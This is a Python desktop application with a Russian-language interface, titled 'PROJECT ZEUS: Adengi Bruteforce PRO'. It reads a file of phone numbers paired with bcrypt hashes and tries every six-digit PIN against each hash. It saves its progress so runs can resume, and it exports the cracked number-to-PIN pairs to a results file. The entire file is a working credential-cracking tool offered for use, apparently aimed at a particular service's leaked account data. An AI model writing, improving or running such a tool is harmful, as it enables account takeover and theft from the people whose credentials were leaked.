import threading
import time
import os
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from passlib.hash import bcrypt

class BruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("PROJECT ZEUS: Adengi Bruteforce PRO")
        self.root.geometry("800x600")
        
        # Глобальные переменные
        self.is_running = False
        self.tasks = []
        self.current_task_index = 0
        self.current_pin = 0
        self.state_file = "zeus_state.dat"
        self.results_file = "cracked_results.txt"
        
        # Интерфейс
        self.create_widgets()
        self.load_state()
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Секция загрузки данных
        input_frame = ttk.LabelFrame(main_frame, text="Загрузка данных", padding=10)
        input_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(input_frame, text="Файл с номерами и хешами:").grid(row=0, column=0, sticky=tk.W)
        self.file_entry = ttk.Entry(input_frame, width=50)
        self.file_entry.grid(row=0, column=1, padx=5)
        ttk.Button(input_frame, text="Обзор", command=self.browse_file).grid(row=0, column=2)
        
        # Статус и управление
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=10)
        
        self.status_var = tk.StringVar(value="Статус: Ожидание запуска")
        ttk.Label(control_frame, textvariable=self.status_var).pack(side=tk.LEFT)
        
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(side=tk.RIGHT)
        ttk.Button(btn_frame, text="СТАРТ", command=self.start_cracking).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="СТОП", command=self.stop_cracking).pack(side=tk.LEFT, padx=5)
        
        # Прогресс
        progress_frame = ttk.LabelFrame(main_frame, text="Прогресс выполнения", padding=10)
        progress_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(progress_frame, text="Текущий номер:").grid(row=0, column=0, sticky=tk.W)
        self.current_number_var = tk.StringVar(value="N/A")
        ttk.Label(progress_frame, textvariable=self.current_number_var).grid(row=0, column=1, sticky=tk.W)
        
        ttk.Label(progress_frame, text="Текущий PIN:").grid(row=1, column=0, sticky=tk.W)
        self.current_pin_var = tk.StringVar(value="000000")
        ttk.Label(progress_frame, textvariable=self.current_pin_var).grid(row=1, column=1, sticky=tk.W)
        
        ttk.Label(progress_frame, text="Общий прогресс:").grid(row=0, column=2, sticky=tk.W, padx=(20,0))
        self.total_progress = ttk.Progressbar(progress_frame, length=250, mode="determinate")
        self.total_progress.grid(row=0, column=3, padx=5)
        
        ttk.Label(progress_frame, text="Прогресс задачи:").grid(row=1, column=2, sticky=tk.W, padx=(20,0))
        self.task_progress = ttk.Progressbar(progress_frame, length=250, mode="determinate")
        self.task_progress.grid(row=1, column=3, padx=5)
        
        # Лог
        log_frame = ttk.LabelFrame(main_frame, text="Лог выполнения", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Кнопки
        action_frame = ttk.Frame(main_frame)
        action_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(action_frame, text="СОХРАНИТЬ РЕЗУЛЬТАТЫ", command=self.save_results).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="ОЧИСТИТЬ ЛОГ", command=self.clear_log).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="ЭКСПОРТ СОСТОЯНИЯ", command=self.export_state).pack(side=tk.RIGHT, padx=5)
    
    def log_message(self, message):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_text.config(state=tk.DISABLED)
        self.log_text.see(tk.END)
    
    def clear_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def browse_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if filename:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filename)
            self.load_data(filename)
    
    def load_data(self, filename):
        try:
            self.tasks = []
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    parts = line.strip().split(':', 1)
                    if len(parts) == 2:
                        self.tasks.append({
                            'number': parts[0].strip(),
                            'hash': parts[1].strip(),
                            'password': None,
                            'status': 'pending'
                        })
            self.log_message(f"Загружено задач: {len(self.tasks)}")
            self.status_var.set(f"Статус: Загружено {len(self.tasks)} задач")
            self.update_progress_bars()
            return True
        except Exception as e:
            self.log_message(f"Ошибка загрузки: {str(e)}")
            return False
    
    def save_results(self):
        try:
            with open(self.results_file, 'w', encoding='utf-8') as f:
                for task in self.tasks:
                    if task['password']:
                        f.write(f"{task['number']}:{task['password']}\n")
            messagebox.showinfo("Успех", f"Результаты сохранены в:\n{os.path.abspath(self.results_file)}")
            self.log_message(f"Результаты экспортированы в {self.results_file}")
        except Exception as e:
            self.log_message(f"Ошибка сохранения: {str(e)}")
    
    def export_state(self):
        self.save_state()
        messagebox.showinfo("Сохранено", f"Текущее состояние сохранено в:\n{os.path.abspath(self.state_file)}")
    
    def save_state(self):
        try:
            with open(self.state_file, 'w', encoding='utf-8') as f:
                f.write(f"{self.current_task_index}\n")
                f.write(f"{self.current_pin}\n")
                for task in self.tasks:
                    f.write(f"{task['number']}:{task['hash']}:{task.get('password', '')}:{task['status']}\n")
            self.log_message("Состояние системы сохранено")
        except Exception as e:
            self.log_message(f"Ошибка сохранения состояния: {str(e)}")
    
    def load_state(self):
        try:
            if os.path.exists(self.state_file):
                with open(self.state_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    if len(lines) > 1:
                        self.current_task_index = int(lines[0].strip())
                        self.current_pin = int(lines[1].strip())
                        self.tasks = []
                        for line in lines[2:]:
                            parts = line.strip().split(':', 3)
                            if len(parts) >= 4:
                                self.tasks.append({
                                    'number': parts[0],
                                    'hash': parts[1],
                                    'password': parts[2] if parts[2] else None,
                                    'status': parts[3]
                                })
                self.log_message(f"Загружено состояние: задача {self.current_task_index}, PIN {self.current_pin}")
                self.update_progress_bars()
        except Exception as e:
            self.log_message(f"Ошибка загрузки состояния: {str(e)}")
    
    def update_progress_bars(self):
        if self.tasks:
            total_progress = (self.current_task_index / len(self.tasks)) * 100
            self.total_progress['value'] = total_progress
        
        task_progress = (self.current_pin / 1000000) * 100 if self.current_pin > 0 else 0
        self.task_progress['value'] = task_progress
    
    def check_password(self, password, target_hash):
        """Проверка пароля через passlib (поддержка $2a$, $2b$, $2y$)"""
        try:
            return bcrypt.verify(password, target_hash)
        except Exception as e:
            self.log_message(f"Ошибка проверки хеша: {str(e)}")
            return False
    
    def process_tasks(self):
        start_time = time.time()
        processed_count = 0
        
        while self.current_task_index < len(self.tasks) and self.is_running:
            task = self.tasks[self.current_task_index]
            
            if task['status'] in ['completed', 'found']:
                self.current_task_index += 1
                self.current_pin = 0
                continue
                
            self.status_var.set(f"Статус: Обработка номера {task['number']}")
            self.current_number_var.set(task['number'])
            
            for pin in range(self.current_pin, 1000000):
                if not self.is_running:
                    self.save_state()
                    return
                    
                pin_str = f"{pin:06d}"
                self.current_pin = pin
                self.current_pin_var.set(pin_str)
                
                if pin % 1000 == 0:
                    self.update_progress_bars()
                
                if self.check_password(pin_str, task['hash']):
                    task['password'] = pin_str
                    task['status'] = 'found'
                    self.log_message(f"НАЙДЕНО: {task['number']} : {pin_str}")
                    break
            
            if task['status'] != 'found':
                task['status'] = 'completed'
                self.log_message(f"Завершено: {task['number']} - пароль не найден")
            
            self.current_task_index += 1
            self.current_pin = 0
            processed_count += 1
            self.update_progress_bars()
            
            if processed_count % 5 == 0:
                self.save_state()
        
        self.is_running = False
        end_time = time.time()
        self.status_var.set("Статус: Все задачи выполнены")
        self.log_message(f"Операция завершена за {end_time - start_time:.2f} секунд")
        self.save_state()
        self.save_results()
    
    def start_cracking(self):
        if not self.tasks:
            self.log_message("Ошибка: сначала загрузите данные!")
            return
        
        if self.is_running:
            return
        
        self.is_running = True
        self.status_var.set("Статус: Запуск подбора паролей")
        threading.Thread(target=self.process_tasks, daemon=True).start()
    
    def stop_cracking(self):
        if self.is_running:
            self.is_running = False
            self.save_state()
            self.status_var.set("Статус: Подбор остановлен")
            self.log_message("Операция остановлена по команде пользователя")
    
    def on_closing(self):
        if self.is_running:
            self.stop_cracking()
        self.save_state()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
